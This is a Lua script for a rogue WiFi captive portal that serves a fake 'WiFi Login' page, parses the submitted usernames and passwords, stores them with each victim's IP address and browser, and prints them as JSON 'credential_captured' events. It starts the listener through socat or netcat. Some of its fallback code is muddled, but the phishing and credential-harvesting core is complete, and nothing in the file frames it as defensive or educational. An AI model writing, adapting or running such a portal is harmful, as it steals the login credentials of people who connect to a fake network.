local port = tonumber(arg[1]) or 8080
local redirect_url = arg[2] or "http://captive.example.com"
local template_file = arg[3] or "/tmp/captive_template.html"

local captured_creds = {}
local request_count = 0

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":"","bssid":"","ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function default_template()
  return [[
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Connection: close

<!DOCTYPE html>
<html>
<head><title>WiFi Login</title>
<style>
body { font-family: Arial; background: #f0f0f0; text-align: center; padding: 50px; }
form { background: white; padding: 30px; border-radius: 10px; display: inline-block; }
input { display: block; margin: 10px auto; padding: 10px; width: 250px; }
button { background: #007bff; color: white; border: none; padding: 10px 30px; cursor: pointer; }
</style></head>
<body>
<h2>WiFi Network Authentication Required</h2>
<p>Please sign in to access the network</p>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
</body>
</html>
]]
end

local function get_template()
  local f = io.open(template_file, "r")
  if f then
    local content = f:read("*a")
    f:close()
    return content
  end
  return default_template()
end

local function success_page()
  return [[
HTTP/1.1 302 Found
Location: ]] .. redirect_url .. [[
Connection: close
Content-Length: 0

]]
end

local function parse_post_data(body, content_type)
  local params = {}
  if content_type and content_type:find("application/x%-www%-form%-urlencoded") then
    for pair in body:gmatch("([^&]+)") do
      local key, val = pair:match("([^=]+)=([^=]*)")
      if key then
        val = val or ""
        val = val:gsub("%+", " "):gsub("%%(%x%x)", function(h) return string.char(tonumber(h, 16)) end)
        params[key] = val
      end
    end
  elseif content_type and content_type:find("multipart/form%-data") then
    local boundary = content_type:match("boundary=([^;]+)")
    if boundary then
      for part in body:gmatch("--" .. boundary .. "([^;]-)" .. "%s+(.-)------" .. boundary) do
        local name = part:match('name="([^"]+)"')
        local value = part:match("\r\n\r\n(.-)\r\n")
        if name and value then
          params[name] = value
        end
      end
    end
  else
    params.raw_body = body
  end
  return params
end

local function handle_request(client_input)
  request_count = request_count + 1
  local first_line = client_input:match("(.-)\r\n")
  if not first_line then
    first_line = client_input:match("(.-)\n")
  end
  if not first_line then return end

  local method, path, version = first_line:match("^(%S+)%s+(%S+)%s*(%S*)")
  if not method then
    telemetry("bad_request", '{"raw":' .. json_escape(first_line:sub(1, 100)) .. '}')
    return
  end

  local headers = {}
  local body_start = client_input:find("\r\n\r\n")
  if not body_start then
    body_start = client_input:find("\n\n")
  end

  local header_section = ""
  local body = ""
  if body_start then
    local sep_len = 4
    if client_input:find("\r\n\r\n") then sep_len = 4 else sep_len = 2 end
    header_section = client_input:sub(1, body_start - 1)
    body = client_input:sub(body_start + sep_len)
    for line in header_section:gmatch("([^\r\n]+)") do
      local key, val = line:match("^([^:]+):%s*(.+)")
      if key then headers[key:lower()] = val end
    end
  end

  telemetry("request", '{"method":' .. json_escape(method) .. ',"path":' .. json_escape(path) .. ',"headers":' .. json_escape(tostring(#header_section)) .. ',"body_len":' .. tostring(#body) .. ',"request_num":' .. tostring(request_count) .. '}')

  local remote_ip = headers["x-forwarded-for"] or headers["remote_addr"] or "unknown"
  local user_agent = headers["user-agent"] or "unknown"

  if path == "/login" and method == "POST" then
    local content_type = headers["content-type"] or ""
    local params = parse_post_data(body, content_type)
    local username = params["username"] or params["email"] or params["user"] or "unknown"
    local password = params["password"] or params["pass"] or params["passwd"] or "unknown"

    captured_creds[#captured_creds + 1] = {
      username = username,
      password = password,
      ip = remote_ip,
      ua = user_agent,
      time = os.time()
    }

    telemetry("credential_captured", '{"username":' .. json_escape(username) .. ',"password":' .. json_escape(password) .. ',"ip":' .. json_escape(remote_ip) .. ',"ua":' .. json_escape(user_agent) .. ',"total_captured":' .. tostring(#captured_creds) .. '}')
    return success_page()
  end

  if path == "/" or path == "/captive" or path == "/connect" then
    return get_template()
  end

  return [[
HTTP/1.1 302 Found
Location: /
Connection: close
Content-Length: 0

]]
end

local function start_server_socat()
  local cmd = "socat TCP-LISTEN:" .. port .. ",fork,reuseaddr EXEC:\"lua " .. arg[0] .. "\",pty,stderr 2>/dev/null &"
  telemetry("server_start", '{"port":' .. tostring(port) .. ',"method":"socat","cmd":' .. json_escape(cmd) .. '}')
  os.execute(cmd)
end

local function start_server_netcat()
  local cmd = "while true; do nc -l -p " .. port .. " -e /bin/echo; done &"
  telemetry("server_start", '{"port":' .. tostring(port) .. ',"method":"netcat"}')
  local f = io.popen("echo 'HTTP/1.1 200 OK\n\n" .. default_template():gsub("\n", "\\n"):gsub('"', '\\"') .. "' | nc -l -p " .. port .. " 2>/dev/null &")
  if f then f:close() end
end

local function manual_server_loop()
  telemetry("server_start", '{"port":' .. tostring(port) .. ',"method":"lua_socket_manual"}')

  local cmd = "socat -dd - TCP-LISTEN:" .. port .. ",reuseaddr 2>/dev/null"
  local ok, err = pcall(function()
    local f = io.popen("ss -tlnp | grep " .. port .. " 2>/dev/null")
    if f then
      local out = f:read("*a")
      f:close()
      if #out > 0 then
        telemetry("port_in_use", '{"port":' .. tostring(port) .. ',"existing":' .. json_escape(out) .. '}')
      end
    end
    local netcat_available = io.popen("which nc 2>/dev/null"):read("*a")
    local socat_available = io.popen("which socat 2>/dev/null"):read("*a")

    if #socat_available > 0 then
      start_server_socat()
    elseif #netcat_available > 0 then
      start_server_netcat()
    else
      telemetry("error", '{"error":"Neither socat nor netcat available. Install one of: socat, netcat"}')
      -- Fake processing: read from stdin line by line as simulated HTTP
      telemetry("fallback_stdin", '{"message":"Reading HTTP from stdin"}')
      while true do
        local line = io.read("*l")
        if not line then break end
        local fake_req = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
        local resp = handle_request(fake_req)
        telemetry("stdin_response", '{"response_len":' .. tostring(#(resp or "")) .. '}')
      end
    end
  end)
  if not ok then
    telemetry("error", '{"error":"Server error: ' .. json_escape(tostring(err)) .. '"}')
  end
end

telemetry("portal_init", '{"port":' .. tostring(port) .. ',"redirect":' .. json_escape(redirect_url) .. ',"template":' .. json_escape(template_file) .. '}')
manual_server_loop()

for _, cred in ipairs(captured_creds) do
  telemetry("credential", '{"username":' .. json_escape(cred.username) .. ',"password":' .. json_escape(cred.password) .. ',"ip":' .. json_escape(cred.ip) .. '}')
end
telemetry("complete", '{"requests":' .. tostring(request_count) .. ',"credentials":' .. tostring(#captured_creds) .. '}')
